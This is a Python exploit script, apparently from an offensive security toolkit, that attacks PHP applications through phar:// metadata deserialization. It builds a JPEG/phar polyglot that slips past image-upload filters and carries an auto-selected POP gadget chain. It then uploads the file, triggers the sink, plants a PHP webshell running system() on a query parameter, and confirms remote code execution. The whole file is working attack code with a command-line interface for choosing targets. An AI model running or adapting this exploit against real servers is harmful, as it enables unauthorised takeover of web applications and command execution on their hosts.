#!/usr/bin/env python3
"""phar:// deserialization -> object injection -> RCE (trigger side).

Weaponises a phar-metadata read on an attacker-named file: sources a __destruct
POP chain, embeds the serialized object as the phar's global metadata inside a
JPEG/phar polyglot (valid SHA1 signature, leading real-JPEG bytes to pass an
image-upload filter), uploads it, and drives the app's phar sink. On PHP 8.x
metadata is lazy, so the trigger must be Phar::getMetadata()/PharFileInfo::
getMetadata() (archive/EXIF/metadata inspectors), not a bare stat.

Application/feature route, not a memory-corruption bug. Pure stdlib, -I safe.
"""
from __future__ import annotations

import argparse
import hashlib
import os
import socket
import struct
import sys
import zlib
from urllib.parse import quote, urlsplit

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "primitives", "tooling"))
import gadget_fingerprint as gfp          # noqa: E402  (fingerprint+chain, read-only)
import session_handler_mismatch as shm    # noqa: E402  (HTTP helpers, read-only)

DEFAULT_SHELL = b"<?php system($_GET['c']); ?>"

def minimal_jpeg() -> bytes:
    """A real, tiny baseline JPEG that getimagesize() accepts as image/jpeg."""
    import base64
    b64 = ("/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8U"
           "HRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA"
           "/8QAFAABAAAAAAAAAAAAAAAAAAAACP/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEA"
           "AD8AfwD/2Q==")
    return base64.b64decode(b64)


# Pure-Python phar writer (polyglot, JPEG-prefixed stub, SHA1-signed).
# phar binary format: <stub ...__HALT_COMPILER();> <manifest> <file data> <sig>.
# Metadata is unserialized by the target on getMetadata() -> object injection.
def build_polyglot_phar(metadata_serialized: bytes,
                        inner_name: bytes = b"x.txt",
                        inner: bytes = b"P2S",
                        alias: bytes = b"") -> bytes:
    """Return a JPEG/phar polyglot carrying `metadata_serialized` as the phar's
    global metadata. Reads cleanly on PHP 8.4.26 with phar.require_hash=On."""
    stub = minimal_jpeg() + b"\x00<?php __HALT_COMPILER(); ?>\r\n"

    comp = inner                                   # stored, no compression
    entry = (struct.pack('<I', len(inner_name)) + inner_name +
             struct.pack('<I', len(inner)) +       # uncompressed size
             struct.pack('<I', 0) +                # timestamp
             struct.pack('<I', len(comp)) +        # compressed size
             struct.pack('<I', zlib.crc32(inner) & 0xffffffff) +
             struct.pack('<I', 0) +                # file flags (stored)
             struct.pack('<I', 0))                 # per-file metadata len (none)

    api = struct.pack('>H', 0x1100)                # API 1.1.0 (BIG-endian field)
    global_flags = 0x00010000                      # PHAR_HDR_SIGNATURE present
    manifest_body = (struct.pack('<I', 1) +        # file count
                     api +
                     struct.pack('<I', global_flags) +
                     struct.pack('<I', len(alias)) + alias +
                     struct.pack('<I', len(metadata_serialized)) +
                     metadata_serialized +
                     entry)
    manifest = struct.pack('<I', len(manifest_body)) + manifest_body

    body = stub + manifest + comp
    body += hashlib.sha1(body).digest() + struct.pack('<I', 0x0002) + b"GBMB"
    return body


# HTTP: multipart file upload (field name configurable).
_BOUND = "P2Sphardeser"


def http_upload(host, port, path, field, filename, data, timeout=20.0):
    body = (b"--" + _BOUND.encode() + b"\r\n"
            b'Content-Disposition: form-data; name="' + field.encode() +
            b'"; filename="' + filename.encode() + b'"\r\n'
            b"Content-Type: image/jpeg\r\n\r\n" + data + b"\r\n"
            b"--" + _BOUND.encode() + b"--\r\n")
    hdr = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
           f"Content-Type: multipart/form-data; boundary={_BOUND}\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.sendall(hdr + body)
        buf = shm._recv_all(s, timeout)
    head, _, rest = buf.partition(b"\r\n\r\n")
    if b"chunked" in head.lower():
        rest = shm._dechunk(rest)
    status = head.split(b"\r\n")[0].decode("latin1", "replace") if head else ""
    return status, rest


def check_rce(host, port, shell_name, cmd, log, timeout=10.0):
    st, body, _ = shm.http_get(host, port, f"/{shell_name}?c={quote(cmd)}",
                               timeout=timeout)
    out = body.decode("latin1", "replace")
    line = next((l for l in out.splitlines() if "uid=" in l), None)
    if line:
        log(f"[+] RCE: {line.strip()}")
        return line.strip()
    return None


# End-to-end run
def run(host, port, upload="/upload.php", upload_field="img",
        trigger="/inspect.php", trigger_param="f",
        docroot="/var/www/html", shell_name="p2s_phar_shell.php",
        img_name="p2s_poly.jpg", cmd="id", phpggc_dir=None, local_php=False,
        object_override=None, verbose=True):
    """Fingerprint -> select chain -> polyglot -> upload -> trigger -> confirm.
    Returns (ok, uid_line, selection)."""

    def log(m):
        if verbose:
            print(m, flush=True)

    shell_path = f"{docroot.rstrip('/')}/{shell_name}"

    # (1) auto-source the POP chain (unless an object is pinned).
    if object_override is not None:
        obj = object_override
        sel = {"preset": "(override)", "template": "(override)",
               "source": "manual", "confidence": "n/a"}
        log(f"[*] using operator-supplied serialized object ({len(obj)} bytes)")
    else:
        log(f"[*] fingerprinting {host}:{port} for a __destruct POP chain")
        fp = gfp.fingerprint(host, port, log)
        sel = gfp.select_chain(fp, log)
        if not sel:
            log("[-] no gadget chain auto-selected (expose composer.lock or pin "
                "--object); target not covered by the registry.")
            return False, None, None
        obj = gfp.emit_gadget(sel, shell_path, DEFAULT_SHELL,
                              phpggc_dir=phpggc_dir, local_php=local_php, log=log)
        if not obj:
            log("[-] could not emit the serialized gadget.")
            return False, None, sel
        log(f"[+] chain: {sel.get('preset') or sel['template']} "
            f"(source={sel['source']}, confidence={sel['confidence']})")

    # (2) wrap the chain as phar global metadata inside a JPEG polyglot.
    poly = build_polyglot_phar(obj)
    log(f"[*] built JPEG/phar polyglot: {len(poly)} bytes "
        f"(JPEG head {poly[:4].hex()}, carries {len(obj)}-byte gadget)")

    # (3) upload past the image filter.
    st, body = http_upload(host, port, upload, upload_field, img_name, poly)
    log(f"[+] upload {upload}: {st} | "
        f"{body[:120].decode('latin1','replace').strip()}")
    if " 200 " not in st:
        log("[-] upload rejected (image filter or endpoint); aborting.")
        return False, None, sel

    # (4) trigger the phar-metadata read.
    tpath = f"{trigger}?{trigger_param}={quote(img_name)}"
    st, body, _ = shm.http_get(host, port, tpath, timeout=15.0)
    log(f"[+] trigger {tpath}: {st} | "
        f"{body[:120].decode('latin1','replace').strip()}")

    # (5) confirm RCE.
    hit = check_rce(host, port, shell_name, cmd, log)
    if hit:
        log(f"[+] webshell: http://{host}:{port}/{shell_name}?c=<cmd>")
        return True, hit, sel
    log("[-] no RCE. On 8.x the sink MUST reach Phar::getMetadata(); a sink that "
        "only does file_exists/is_file/filesize will NOT unserialize (hardening).")
    return False, None, sel


def main(argv):
    ap = argparse.ArgumentParser(
        description="AVENUE #2 phar:// deserialization -> object injection -> RCE "
                    "(JPEG/phar polyglot, auto-sourced POP chain).")
    ap.add_argument("url", help="base URL, e.g. http://127.0.0.1:8144")
    ap.add_argument("--upload", default="/upload.php")
    ap.add_argument("--upload-field", default="img")
    ap.add_argument("--trigger", default="/inspect.php")
    ap.add_argument("--trigger-param", default="f")
    ap.add_argument("--docroot", default="/var/www/html")
    ap.add_argument("--shell-name", default="p2s_phar_shell.php")
    ap.add_argument("--img-name", default="p2s_poly.jpg")
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--phpggc", default=None,
                    help="phpggc checkout (only for phpggc-kind chains)")
    ap.add_argument("--local-php", action="store_true")
    ap.add_argument("--object", default=None,
                    help="raw serialized object to plant (skips fingerprinting)")
    ap.add_argument("--write-phar", default=None,
                    help="also write the polyglot to this local path (offline)")
    args = ap.parse_args(argv)

    u = urlsplit(args.url)
    if u.scheme not in ("http", ""):
        raise SystemExit(f"only http:// targets supported, got {u.scheme!r}")
    host = u.hostname or "127.0.0.1"
    port = u.port or 80

    obj_override = args.object.encode() if args.object is not None else None
    if args.write_phar:
        o = obj_override if obj_override is not None else \
            gfp.build_monolog_fw1(f"{args.docroot}/{args.shell_name}", DEFAULT_SHELL)
        with open(args.write_phar, "wb") as f:
            f.write(build_polyglot_phar(o))
        print(f"[+] wrote polyglot to {args.write_phar}")

    ok, _hit, _sel = run(host, port, upload=args.upload,
                         upload_field=args.upload_field, trigger=args.trigger,
                         trigger_param=args.trigger_param, docroot=args.docroot,
                         shell_name=args.shell_name, img_name=args.img_name,
                         cmd=args.cmd, phpggc_dir=args.phpggc,
                         local_php=args.local_php, object_override=obj_override)
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
